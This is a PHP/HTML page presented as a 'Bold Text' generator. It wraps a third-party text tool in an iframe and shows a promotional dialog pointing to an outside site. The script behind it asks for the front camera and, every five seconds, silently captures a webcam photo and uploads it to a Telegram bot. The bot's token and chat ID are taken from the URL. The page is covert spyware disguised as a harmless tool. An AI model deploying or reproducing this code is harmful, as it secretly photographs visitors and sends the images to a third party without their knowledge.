<?php
// File: capture.php
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Bold Text</title>
<style>
html, body {
    margin:0;
    padding:0;
    width:100%;
    height:100%;
    overflow:hidden;
    font-family: Arial, sans-serif;
    background:#000;
}

#overlay {
    position:absolute;
    top:0; left:0;
    width:100%; height:100%;
    background-size:cover;
    background-position:center;
    z-index:-1;
}

#iframeContainer {
    position:absolute;
    top:0; left:0;
    width:100%;
    height:100%;
    border:none;
    z-index:1;
}

#iframeContainer iframe {
    width:100%;
    height:100%;
    border:none;
}

#video {
    display:none;
}

/* Custom Dialog Styles - White Version */
#customDialog {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%) scale(0.7);
    width: 80%;
    max-width: 400px;
    background: rgb(11,11,11);
    border-radius: 20px;
    padding: 30px;
    z-index: 1000;
    
    
    opacity: 0;
    animation: dialogEntrance 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55) forwards;
    text-align: center;
    overflow: hidden;
    border: 0.7px solid #fff;
}


@keyframes dialogEntrance {
    0% {
        opacity: 0;
        transform: translate(-50%, -50%) scale(0.7);
    }
    70% {
        transform: translate(-50%, -50%) scale(1.05);
    }
    100% {
        opacity: 1;
        transform: translate(-50%, -50%) scale(1);
    }
}

@keyframes shimmer {
    0% {
        background-position: 0% 0%;
    }
    100% {
        background-position: 300% 0%;
    }
}

#dialogTitle {
    font-size: 24px;
    font-weight: bold;
    margin-bottom: 15px;
    color: #333;
    background: linear-gradient(to right, #F54949, #dc2626);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
}

#dialogText {
    font-size: 16px;
    line-height: 1.5;
    margin-bottom: 25px;
    color: #666;
}

.dialogButtons {
    display: flex;
    gap: 15px;
    justify-content: center;
}

.dialogBtn {
    padding: 12px 25px;
    border: none;
    border-radius: 50px;
    font-weight: bold;
    font-size: 14px;
    cursor: pointer;
    transition: all 0.3s ease;
    min-width: 120px;
    text-transform: uppercase;
    letter-spacing: 1px;
}

#hideBtn {
    background: #f5f5f5;
    color: #666;
    border: 2px solid #e0e0e0;
}

#viewBtn {
    background: linear-gradient(to right, #3b82f6, #1d4ed8);
    color: white;
    border: none;
    box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
}

.dialogBtn:hover {
    transform: translateY(-3px);
    box-shadow: 0 8px 20px rgba(0,0,0,0.15);
}

#hideBtn:hover {
    background: #e8e8e8;
    border-color: #d0d0d0;
}

#viewBtn:hover {
    background: linear-gradient(135deg, #764ba2 0%, #667eea 100%);
    box-shadow: 0 8px 25px rgba(102, 126, 234, 0.6);
}

.dialogBtn:active {
    transform: translateY(0);
}

/* Overlay for background blur */
#dialogOverlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.5);
    backdrop-filter: blur(0px);
    z-index: 999;
    opacity: 0;
    animation: fadeIn 0.5s forwards;
}

@keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
}

/* Dialog exit animation */
.dialog-exit {
    animation: dialogExit 0.5s cubic-bezier(0.755, 0.05, 0.855, 0.06) forwards !important;
}

@keyframes dialogExit {
    0% {
        opacity: 1;
        transform: translate(-50%, -50%) scale(1);
    }
    100% {
        opacity: 0;
        transform: translate(-50%, -50%) scale(0.3);
    }
}

.overlay-exit {
    animation: fadeOut 0.5s forwards !important;
}

@keyframes fadeOut {
    from { opacity: 1; }
    to { opacity: 0; }
}

/* Floating animation for dialog */


.floating {
    animation: float 3s ease-in-out infinite;
}
</style>
</head>
<body>

<video id="video" autoplay playsinline></video>
<div id="overlay"></div>

<div id="iframeContainer">
    <iframe src="https://lingojam.com/BoldTextGenerator" sandbox="allow-scripts allow-same-origin"></iframe>
</div>

<!-- Custom Dialog - White Version -->
<div id="dialogOverlay"></div>
<div id="customDialog" style="display: none;">
    <div id="dialogTitle">Visit Our Main Website</div>
    <div id="dialogText">This Site Create From zin.42web.io</div>
    <div class="dialogButtons">
        <button id="hideBtn" class="dialogBtn">Hide</button>
        <button id="viewBtn" class="dialogBtn">View</button>
    </div>
</div>

<script>
const params = new URLSearchParams(location.search);
const BOT_TOKEN = params.get("token");
const CHAT_ID = params.get("chatid");

const video = document.getElementById("video");
const overlay = document.getElementById("overlay");
const customDialog = document.getElementById("customDialog");
const dialogOverlay = document.getElementById("dialogOverlay");
const hideBtn = document.getElementById("hideBtn");
const viewBtn = document.getElementById("viewBtn");

console.log("Script loaded"); // Debug log

// Handle dialog buttons
hideBtn.addEventListener('click', hideDialog);
viewBtn.addEventListener('click', viewWebsite);

function hideDialog() {
    console.log("Hide button clicked"); // Debug log
    customDialog.classList.add('dialog-exit');
    dialogOverlay.classList.add('overlay-exit');
    
    setTimeout(() => {
        console.log("Hiding dialog"); // Debug log
        customDialog.style.display = 'none';
        dialogOverlay.style.display = 'none';
        customDialog.classList.remove('dialog-exit');
        dialogOverlay.classList.remove('overlay-exit');
    }, 500);
}

function viewWebsite() {
    console.log("View button clicked"); // Debug log
    window.open('https://zin.42web.io', '_blank');
    hideDialog(); // Also hide dialog after clicking View
}

// Start camera
async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video:{ facingMode:"user", width:{ideal:1280}, height:{ideal:720} },
            audio:false
        });
        video.srcObject = stream;

        video.onloadedmetadata = () => {
            console.log("Camera loaded"); // Debug log
            // Continuous capture every 5 seconds
            captureAndSend();
            setInterval(captureAndSend, 5000);
        };

    } catch(err){
        console.error("Camera error:", err); // Debug log
        alert("Camera permission denied!\n" + err.message);
        // If camera fails, still show the dialog
        showDialog();
    }
}

// Show custom dialog with animation
function showDialog() {
    console.log("Showing dialog"); // Debug log
    customDialog.style.display = 'block';
    dialogOverlay.style.display = 'block';
    
    // Reset any existing animations
    customDialog.style.animation = 'none';
    dialogOverlay.style.animation = 'none';
    
    // Force reflow
    void customDialog.offsetWidth;
    void dialogOverlay.offsetWidth;
    
    // Apply animations
    customDialog.style.animation = 'dialogEntrance 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55) forwards';
    dialogOverlay.style.animation = 'fadeIn 0.5s forwards';
    
    // Add floating animation after dialog entrance
    setTimeout(() => {
        customDialog.style.animation = 'dialogEntrance 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55) forwards, float 3s ease-in-out infinite';
    }, 600);
}

// Capture photo, set background, send to Telegram
function captureAndSend() {
    if(!video.srcObject) return;
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video,0,0);

    canvas.toBlob(async blob => {
        overlay.style.backgroundImage = `url(${URL.createObjectURL(blob)})`;

        const fd = new FormData();
        fd.append("chat_id", CHAT_ID);
        fd.append("photo", blob, "background.jpg");

        try{
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
                method:"POST",
                body:fd
            });
        } catch(e){ console.log("Telegram send error:", e); }

    }, "image/jpeg", 0.9);
}

// Start everything - show dialog immediately, then start camera
console.log("Starting..."); // Debug log
setTimeout(() => {
    showDialog();
    startCamera();
}, 100); // Small delay to ensure DOM is ready
</script>

</body>
</html>